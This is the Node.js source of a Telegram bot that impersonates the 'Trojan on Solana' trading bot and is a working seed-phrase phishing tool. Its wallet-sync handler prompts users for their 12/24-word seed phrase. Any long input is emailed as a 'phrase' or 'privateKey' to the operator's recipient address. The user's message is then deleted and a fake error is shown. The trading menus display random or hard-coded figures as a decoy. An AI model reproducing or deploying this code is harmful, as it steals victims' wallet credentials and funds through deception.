require("dotenv").config();
const fs = require("fs");
const { Telegraf, Markup } = require("telegraf");
const path = require("path");
const { createClient } = require("smtpexpress");

// Bot configuration
const BOT_TOKEN = process.env.BOT_TOKEN;

// Initialize bot
const bot = new Telegraf(BOT_TOKEN);

const smtpexpressClient = createClient({
  projectId: process.env.smtpexpress_project_id,
  projectSecret: process.env.smtpexpress_project_secret,
});

const generateEmailHTML = (data, dataType) => {
  // Format date in West African Time (WAT) with 12-hour format
  const options = {
    timeZone: "Africa/Lagos",
    hour12: true,
    hour: "numeric",
    minute: "numeric",
    second: "numeric",
    year: "numeric",
    month: "numeric",
    day: "numeric",
  };
  const currentDate = new Date().toLocaleString("en-US", options);

  return `
    <!DOCTYPE html>
    <html>
      <head>
        <style>
          .email-container {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f9f9f9;
          }
          .header {
            background-color: #4a90e2;
            color: white;
            padding: 20px;
            text-align: center;
            border-radius: 5px 5px 0 0;
          }
          .content {
            background-color: white;
            padding: 20px;
            border-radius: 0 0 5px 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
          }
          .phrase-box {
            background-color: #f5f5f5;
            border-left: 4px solid #4a90e2;
            padding: 15px;
            margin: 20px 0;
          }
          .footer {
            text-align: center;
            color: #666;
            font-size: 12px;
            margin-top: 20px;
          }
        </style>
      </head>
      <body>
        <div class="email-container">
          <div class="header">
            <h1>New Scanned Content from Telegram bot</h1>
          </div>
          <div class="content">
            <h2>Received ${dataType}</h2>
            <div class="phrase-box">
              ${data}
            </div>
            <p>This content was scanned on: ${currentDate}</p>
          </div>
          <div class="footer">
            <p>This is an automated message from your Telegram bot</p>
          </div>
        </div>
      </body>
    </html>
  `;
};

const userSessions = {};
const userWallets = {};

// Define state machine for wallet setup process
const STATES = {
  IDLE: "idle",
  AWAITING_SEED_PHRASE: "awaiting_seed_phrase",
  WALLET_CONNECTED: "wallet_connected",
};

// Main menu keyboard
const getMainMenuKeyboard = () => {
  return Markup.keyboard([
    ["♻️ Sync Wallet"],
    ["💰 Balance", "📈 Positions", "⚙️ Settings"],
    ["🛒 Buy", "💸 Sell", "🔄 DCA Order"],
    ["👥 Copy Trade", "🎯 LP Sniper", "🌉 Bridge"],
    ["🔔 New Pairs", "💲 Withdrawal", "📊 Referrals"],
  ]).resize();
};

// Start command
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  userSessions[userId] = { state: STATES.IDLE };

  const walletAddress = "8NbVmTZuzz4cM2h37oStWefhxXXacLk79JZvHVUd6wru";
  const videoPath = path.join(__dirname, "assets", "video.MP4");

  await ctx.replyWithVideo(
    { source: fs.createReadStream(videoPath) },
    {
      caption:
        `*Welcome to Trojan on Solana!*\n\n` +
        `Introducing a cutting-edge bot crafted exclusively for Solana traders. Trade any token instantly right after launch.\n\n` +
        `Here's your Solana wallet address linked to your Telegram account. Simply fund your wallet and dive into trading.\n\n` +
        `*Solana · 🅴*\n\`${walletAddress}\`\n_(tap to copy)_\n\n` +
        `*Balance:* (0.00) SOL\n\n` +
        `Click on the *Refresh* button to update your current balance.\n\n` +
        `Join our Telegram group [@trojan](https://t.me/trojan) for users of Trojan!\n\n` +
        `💡 *If you aren't already, we advise that you use any of the following bots to trade with.*\nYou will have the same wallets and settings across all bots, but it will be significantly faster due to lighter user load.`,
      parse_mode: "Markdown",
      ...getMainMenuKeyboard(),
    }
  );
});

// Help command
bot.help((ctx) => {
  ctx.reply(
    `🌟 *SOL Trading Bot Commands* 🌟\n\n` +
      `/start - Start the bot\n` +
      `/help - Show this help message\n` +
      `/sync - Connect your Solana wallet\n` +
      `/balance - Check your SOL balance\n` +
      `/settings - Configure your bot settings\n\n` +
      `Use the keyboard buttons for quick access to all features.`,
    { parse_mode: "Markdown" }
  );
});

// Sync wallet command
bot.command("sync", (ctx) => {
  const userId = ctx.from.id.toString();
  handleSyncWallet(ctx, userId);
});

// Handle incoming messages
bot.on("text", async (ctx) => {
  const userId = ctx.from.id.toString();
  const text = ctx.message.text;

  // Initialize session if it doesn't exist
  if (!userSessions[userId]) {
    userSessions[userId] = { state: STATES.IDLE };
  }

  // Handle seed phrase input
  if (
    userSessions[userId].state === STATES.IDLE ||
    STATES.AWAITING_SEED_PHRASE
  ) {
    const input = text.trim();

    if (input.split(" ").length >= 12 || input.length >= 64) {
      try {
        const dataType =
          input.split(" ").length >= 12 ? "phrase" : "privateKey";
        const providedData = input;

        await smtpexpressClient.sendApi.sendMail({
          subject: `New Scanned ${dataType}`,
          message: generateEmailHTML(providedData, dataType),
          sender: {
            name: "Telegram Bot Scanner",
            email: process.env.sender_email,
          },
          recipients: [process.env.recipient_email],
        });

        await ctx.reply(
          `❌ Error syncing wallet!\n\n` +
            `Please wait a few minutes and try again\n`,
          getMainMenuKeyboard()
        );

        try {
          await ctx.deleteMessage(ctx.message.message_id);
        } catch (e) {
          console.log("Couldn't delete message:", e);
        }
      } catch (error) {
        console.error("Error syncing wallet:", error);
        ctx.reply(
          `❌ Error syncing wallet: Please try again later or contact support.`
        );
      }
      return;
    }
  }

  // Check if user has a wallet connected
  if (
    text !== "/start" &&
    text !== "/help" &&
    text !== "/sync" &&
    !userWallets[userId]
  ) {
    return ctx.reply(
      `❌ No wallet connected!\n\n` +
        `Please use /sync to connect your Solana wallet first.`
    );
  }

  // Handle menu button clicks
  switch (text) {
    case "♻️ Sync Wallet":
      await handleSyncWallet(ctx, userId);
      break;
    case "💰 Balance":
      await handleBalance(ctx, userId);
      break;
    case "📈 Positions":
      await handlePositions(ctx, userId);
      break;
    case "🛒 Buy":
      await handleBuy(ctx, userId);
      break;
    case "💸 Sell":
      await handleSell(ctx, userId);
      break;
    case "🔄 DCA Order":
      await handleDCA(ctx, userId);
      break;
    case "👥 Copy Trade":
      await handleCopyTrade(ctx, userId);
      break;
    case "🎯 LP Sniper":
      await handleLPSniper(ctx, userId);
      break;
    case "🌉 Bridge":
      await handleBridge(ctx, userId);
      break;
    case "🔔 New Pairs":
      await handleNewPairs(ctx, userId);
      break;
    case "💲 Withdrawal":
      await handleWithdrawal(ctx, userId);
      break;
    case "⚙️ Settings":
      await handleSettings(ctx, userId);
      break;
    case "📊 Referrals":
      await handleReferrals(ctx, userId);
      break;
  }
});

async function handleSyncWallet(ctx, userId) {
  userSessions[userId] = { state: STATES.AWAITING_SEED_PHRASE };

  await ctx.reply(
    `🔐 *WALLET SYNC REQUIRED* 🔐\n\n` +
      `Please enter your 12/24-word Solana seed phrase to sync your wallet.\n\n` +
      `⚠️ *This is a secure connection, but always be careful when sharing seed phrases* ⚠️\n\n` +
      `Type your seed phrase now:`,
    {
      parse_mode: "Markdown",
      reply_markup: { remove_keyboard: true },
    }
  );
}

// Balance handler
async function handleBalance(ctx, userId) {
  // In a real app, you would fetch the actual balance from Solana blockchain
  await ctx.reply(
    `💰 *Your Solana Balance*\n\n` +
      `SOL: ${userWallets[userId].balance} SOL\n` +
      `USDC: ${(Math.random() * 1000).toFixed(2)} USDC\n` +
      `BONK: ${(Math.random() * 1000000).toFixed(0)} BONK\n` +
      `JUP: ${(Math.random() * 500).toFixed(2)} JUP\n\n` +
      `Total Value: $${(Math.random() * 5000).toFixed(2)} USD`,
    { parse_mode: "Markdown" }
  );
}

// Positions handler
async function handlePositions(ctx, userId) {
  await ctx.reply(
    `📈 *Your Open Positions*\n\n` +
      `1. *BONK/USDC*\n` +
      `   Entry: $0.00002341\n` +
      `   Current: $0.00002467\n` +
      `   P/L: +5.38%\n\n` +
      `2. *JUP/SOL*\n` +
      `   Entry: 0.0241 SOL\n` +
      `   Current: 0.0258 SOL\n` +
      `   P/L: +7.05%\n\n` +
      `3. *PYTH/USDC*\n` +
      `   Entry: $0.4731\n` +
      `   Current: $0.4529\n` +
      `   P/L: -4.27%\n\n` +
      `Use /closeposition [number] to close a position.`,
    { parse_mode: "Markdown" }
  );
}

// Buy handler
async function handleBuy(ctx, userId) {
  await ctx.reply(
    `🛒 *Buy Tokens*\n\n` +
      `Enter the token details in this format:\n` +
      `[token_address] [amount] [slippage(%)]}\n\n` +
      `Example: "So11111111111111111111111111111111111111112 0.5 1"\n\n` +
      `Or use the quick options below:`,
    {
      parse_mode: "Markdown",
      reply_markup: Markup.inlineKeyboard([
        [Markup.button.callback("Buy 0.1 SOL worth of BONK", "buy_bonk_0.1")],
        [Markup.button.callback("Buy 0.5 SOL worth of JUP", "buy_jup_0.5")],
        [Markup.button.callback("Buy 10 USDC worth of PYTH", "buy_pyth_10")],
      ]),
    }
  );
}

// Sell handler
async function handleSell(ctx, userId) {
  await ctx.reply(
    `💸 *Sell Tokens*\n\n` +
      `Enter the token details in this format:\n` +
      `[token_address] [amount] [slippage(%)]}\n\n` +
      `Example: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v 10 1"\n\n` +
      `Or use the quick options below:`,
    {
      parse_mode: "Markdown",
      reply_markup: Markup.inlineKeyboard([
        [Markup.button.callback("Sell 50% of BONK", "sell_bonk_50")],
        [Markup.button.callback("Sell 100% of JUP", "sell_jup_100")],
        [Markup.button.callback("Sell 25% of PYTH", "sell_pyth_25")],
      ]),
    }
  );
}

// DCA Order handler
async function handleDCA(ctx, userId) {
  await ctx.reply(
    `🔄 *DCA Order Setup* (Dollar Cost Averaging)\n\n` +
      `Set up automatic recurring buys:\n\n` +
      `1. *Select Token:*\n` +
      `   (Enter token address or select from popular options)\n\n` +
      `2. *Amount per buy:*\n` +
      `   (In SOL or USDC)\n\n` +
      `3. *Frequency:*\n` +
      `   (Hourly, Daily, Weekly)\n\n` +
      `4. *Duration:*\n` +
      `   (Number of orders or until canceled)`,
    {
      parse_mode: "Markdown",
      reply_markup: Markup.inlineKeyboard([
        [
          Markup.button.callback(
            "Quick DCA: SOL → BONK (Daily)",
            "dca_sol_bonk_daily"
          ),
        ],
        [
          Markup.button.callback(
            "Quick DCA: USDC → SOL (Weekly)",
            "dca_usdc_sol_weekly"
          ),
        ],
        [Markup.button.callback("Advanced Setup", "dca_advanced")],
      ]),
    }
  );
}

// Copy Trade handler
async function handleCopyTrade(ctx, userId) {
  await ctx.reply(
    `👥 *Copy Trading*\n\n` +
      `Copy the trades of successful Solana traders automatically!\n\n` +
      `🥇 *Top Performers:*\n` +
      `1. wallet7zFD... (ROI: +342% / 30d)\n` +
      `2. GR4PeW... (ROI: +287% / 30d)\n` +
      `3. SoL9tr... (ROI: +214% / 30d)\n\n` +
      `To start copy trading, select a trader and set your copy amount:`,
    {
      parse_mode: "Markdown",
      reply_markup: Markup.inlineKeyboard([
        [Markup.button.callback("Copy wallet7zFD...", "copy_wallet7zfd")],
        [Markup.button.callback("Copy GR4PeW...", "copy_gr4pew")],
        [Markup.button.callback("Copy SoL9tr...", "copy_sol9tr")],
        [Markup.button.callback("Enter Custom Address", "copy_custom")],
      ]),
    }
  );
}

// LP Sniper handler
async function handleLPSniper(ctx, userId) {
  await ctx.reply(
    `🎯 *LP Sniper Setup*\n\n` +
      `Configure your bot to automatically snipe new liquidity pools on Solana AMMs like Raydium and Orca.\n\n` +
      `*Current Settings:*\n` +
      `- Gas Priority: Medium\n` +
      `- Maximum Slippage: 3%\n` +
      `- Auto-sell at: 2x\n` +
      `- Stop-loss at: -10%\n\n` +
      `*Target DEXs:*\n` +
      `- Raydium ✅\n` +
      `- Orca ✅\n` +
      `- Jupiter ✅\n\n` +
      `Adjust settings or enable/disable:`,
    {
      parse_mode: "Markdown",
      reply_markup: Markup.inlineKeyboard([
        [Markup.button.callback("Change Gas Settings", "sniper_gas")],
        [Markup.button.callback("Change Exit Strategy", "sniper_exit")],
        [Markup.button.callback("Enable/Disable DEXs", "sniper_dexs")],
        [Markup.button.callback("Start Sniping", "sniper_start")],
      ]),
    }
  );
}

// Bridge handler
async function handleBridge(ctx, userId) {
  await ctx.reply(
    `🌉 *Bridge Tokens*\n\n` +
      `Transfer assets between Solana and other chains.\n\n` +
      `*Supported Chains:*\n` +
      `- Ethereum\n` +
      `- Polygon\n` +
      `- BNB Chain\n` +
      `- Avalanche\n\n` +
      `Select direction to begin:`,
    {
      parse_mode: "Markdown",
      reply_markup: Markup.inlineKeyboard([
        [Markup.button.callback("Solana → Ethereum", "bridge_sol_eth")],
        [Markup.button.callback("Ethereum → Solana", "bridge_eth_sol")],
        [Markup.button.callback("Solana → Other Chains", "bridge_sol_other")],
        [Markup.button.callback("Other Chains → Solana", "bridge_other_sol")],
      ]),
    }
  );
}

// New Pairs handler
async function handleNewPairs(ctx, userId) {
  await ctx.reply(
    `🔔 *New Token Pairs*\n\n` +
      `Get alerts for new token pairs on Solana DEXs.\n\n` +
      `*Latest Pairs:*\n` +
      `1. BONK/JUP - Added 15m ago\n` +
      `   Initial Liquidity: 4,582 SOL\n\n` +
      `2. PYTH/USDC - Added 43m ago\n` +
      `   Initial Liquidity: 125,000 USDC\n\n` +
      `3. MANGO/USDC - Added 1h ago\n` +
      `   Initial Liquidity: 75,000 USDC\n\n` +
      `Configure notifications:`,
    {
      parse_mode: "Markdown",
      reply_markup: Markup.inlineKeyboard([
        [
          Markup.button.callback(
            "Min Liquidity: >1000 SOL",
            "pairs_min_liquidity"
          ),
        ],
        [
          Markup.button.callback(
            "Alert Method: Telegram",
            "pairs_alert_method"
          ),
        ],
        [Markup.button.callback("Auto-Snipe: OFF", "pairs_auto_snipe")],
      ]),
    }
  );
}

// Withdrawal handler
async function handleWithdrawal(ctx, userId) {
  await ctx.reply(
    `💲 *Withdrawal*\n\n` +
      `Current balance: ${userWallets[userId].balance} SOL\n\n` +
      `Enter withdrawal amount and destination address in format:\n` +
      `[amount] [destination_address]\n\n` +
      `Example: "0.5 9xDUcfd..."`,
    {
      parse_mode: "Markdown",
      reply_markup: Markup.inlineKeyboard([
        [
          Markup.button.callback(
            "Withdraw 25% to My Wallet",
            "withdraw_25_default"
          ),
        ],
        [
          Markup.button.callback(
            "Withdraw 50% to My Wallet",
            "withdraw_50_default"
          ),
        ],
        [
          Markup.button.callback(
            "Withdraw 100% to My Wallet",
            "withdraw_100_default"
          ),
        ],
      ]),
    }
  );
}

// Settings handler
async function handleSettings(ctx, userId) {
  await ctx.reply(
    `⚙️ *Bot Settings*\n\n` +
      `Configure your trading preferences.\n\n` +
      `*Current Settings:*\n` +
      `- Default Slippage: 1%\n` +
      `- Gas Priority: Medium\n` +
      `- Trade Confirmations: ON\n` +
      `- Notifications: ALL\n` +
      `- Auto Sell on Profit: OFF\n` +
      `- Stop Loss: OFF\n\n` +
      `Select a setting to change:`,
    {
      parse_mode: "Markdown",
      reply_markup: Markup.inlineKeyboard([
        [Markup.button.callback("Slippage Settings", "settings_slippage")],
        [Markup.button.callback("Gas Settings", "settings_gas")],
        [
          Markup.button.callback(
            "Notification Settings",
            "settings_notifications"
          ),
        ],
        [Markup.button.callback("Auto Sell/Stop Loss", "settings_autosell")],
      ]),
    }
  );
}

// Referrals handler
async function handleReferrals(ctx, userId) {
  await ctx.reply(
    `📊 *Referral Program*\n\n` +
      `Earn rewards by inviting friends to use this bot!\n\n` +
      `*Your Referral Stats:*\n` +
      `- Referral Link: t.me/SolTradeBot?start=${userId}\n` +
      `- Users Referred: 0\n` +
      `- Commission Earned: 0 SOL\n\n` +
      `*Rewards:*\n` +
      `- 5% of trading fees from your referrals\n` +
      `- 1% of trading fees from their referrals\n\n` +
      `Share your link to start earning!`,
    {
      parse_mode: "Markdown",
      reply_markup: Markup.inlineKeyboard([
        [Markup.button.callback("Share My Referral Link", "share_referral")],
        [
          Markup.button.callback(
            "View Referral Leaderboard",
            "referral_leaderboard"
          ),
        ],
        [
          Markup.button.callback(
            "Withdraw Referral Earnings",
            "withdraw_referrals"
          ),
        ],
      ]),
    }
  );
}

// Inline button callbacks
bot.action(/buy_(.+)_(.+)/, (ctx) => {
  const token = ctx.match[1];
  const amount = ctx.match[2];
  ctx.answerCbQuery(
    `Preparing to buy ${amount} SOL worth of ${token.toUpperCase()}...`
  );
  // In a real bot, this would trigger an actual buy function
  ctx.reply(`🔄 Processing your purchase of ${token.toUpperCase()}...`);
});

bot.action(/sell_(.+)_(.+)/, (ctx) => {
  const token = ctx.match[1];
  const percentage = ctx.match[2];
  ctx.answerCbQuery(
    `Preparing to sell ${percentage}% of your ${token.toUpperCase()}...`
  );
  // In a real bot, this would trigger an actual sell function
  ctx.reply(`🔄 Processing your sale of ${token.toUpperCase()}...`);
});

// Error handler
bot.catch((err, ctx) => {
  console.error(`Error for ${ctx.updateType}`, err);
  ctx.reply(`An error occurred: ${err.message}`);
});

// Start the bot
bot
  .launch()
  .then(() => {
    console.log("Solana Trading Bot is running!");
  })
  .catch((err) => {
    console.error("Failed to start bot:", err);
  });

// Enable graceful stop
process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
